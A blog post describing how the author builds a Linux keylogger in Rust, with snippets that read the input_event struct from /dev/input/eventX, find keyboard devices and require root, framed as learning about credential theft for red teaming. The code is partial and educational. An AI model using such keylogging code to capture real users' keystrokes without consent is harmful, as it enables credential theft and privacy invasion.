---
layout: single
title: Developing a keylogger
---

To learn about credentials stealing, I have decided to develop a keylogger on Linux. I decided to use Rust for the task since this language is quite different
from the usual C and deals with memory in a slightly different way, which will be important for keylogger. Moreover, keyloggers can be pretty useful for red
teamers since this is an easy way to steal credentials to services that should be private.

## How do keyloggers work?

Before getting to implementation I had to understand how keylogging works. In essence, each operating system has a multitude of different approaches for
logging keystrokes. In Windows for example, one can use the [SetWindowsHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
function to inject a hook to intercept keystrokes, just like that. There are also hardware keyloggers that could be physically plugged inbeetwen the keyboard and
the computer. However, I wanted to see how it would work on Linux, because it has a slightly more raw approach to logging keys.

## Marshalling

Unix-like systems follow the well known philosophy: 'Everything is a file'. Essentially, this means that almost all system internals are exposed as a stream of bytes
accessible through the OS' filesystem API. Since GNU/Linux was written mainly in C, the files representing system internals are C structures most of the time.
For example, the file which exposes keystroke events at `/dev/input/eventX` is in fact a stream of bytes which make up the the `input_event` struct.
This is the original, C version of the struct:

```c
struct input_event {
    struct timeval time;
    unsigned short type;
    unsigned short code;
    unsigned int value;
};
```

If a programming language would want to work with an input event, it would need to cast the bytes making up the struct into it's own binding of the C library. In Rust,
the official `libc` implementation defines this version of `input_event` struct:

```rust
pub struct input_event {
    pub time: ::timeval,
    pub type_: ::__u16,
    pub code: ::__u16,
    pub value: ::__s32,
}
```

As depicted, the Rust's version takes the same amount of memory as the C struct - 24 bytes on my computer. So in order to be able to use the `input_event` struct
in Rust, it needs to be transmuted from an _unsafe_ byte array to a _managed_ one, like that:

```rust
use libc::input_event;

// Get the size of the Rust's input_event struct
const EV_SIZE: usize = mem::size_of::<input_event>();
let mut buf: [u8; EV_SIZE] = unsafe { mem::zeroed() };

// Cast the C struct to empty array
let ev = unsafe { mem::transmute::<[u8; EV_SIZE], input_event>(buf) };
```

This approach requires a bit more knowledge from the programmer, but if somebody is going down into system internals they need to understand it in-depth.
Moreover, in case of some custom or not-yet-implemented C data types, the programmer has freedom to create their own bindings for the said structures.

## Implementation

Since I am using a laptop with keyboard connected to it, I wanted to be sure that my keylogger would work with all input devices on the computer.

```rust
const BUS_PATH: &str = "/proc/bus/input/devices";

fn parse_bus(&self) -> Vec<String> {
    let bus = File::open(BUS_PATH).unwrap();
    let lines = Box::new(BufReader::new(bus).lines());

    let mut handlers = Vec::<String>::new(); // this vector will store keyboard handlers
    let entry = RefCell::new(String::new());
    let re = Regex::new(r"(?m)(event\d+)").unwrap();

    for line in lines {
        // ... skipping over some code

        if entry.borrow().contains("EV=120013") { 
            let entry_guard = entry.borrow();
            if let Some(captures) = re.captures(&entry_guard) {  // get the event name using regex
                if let Some(m) = captures.get(0) { handlers.push(m.as_str().to_string()) }
            }
        } 

        // ...
    }

    return handlers;
}
```

As depicted in the snippet above, the keylogger enumerates through all devices that contain `EV=120013` in their specification,
which in Linux means that these are keyboards. I am going to skip over the whole implementation, since it is quite big, but
details can be seen in my [keylogger repository](https://github.com/malpa222/keylogger/).

As one more precaution, I had to ensure that the program is being run as root with this simple check:

```rust
fn start_logging(&self) {
    if unsafe { libc::geteuid() } != 0 { panic!("Must run as root") }

    self.log_keystrokes();
}
```

Below, you can take a look at a demo. The keylogger is intercepting and printing out my keystrokes.

{% include video id="772185525" provider="vimeo" %}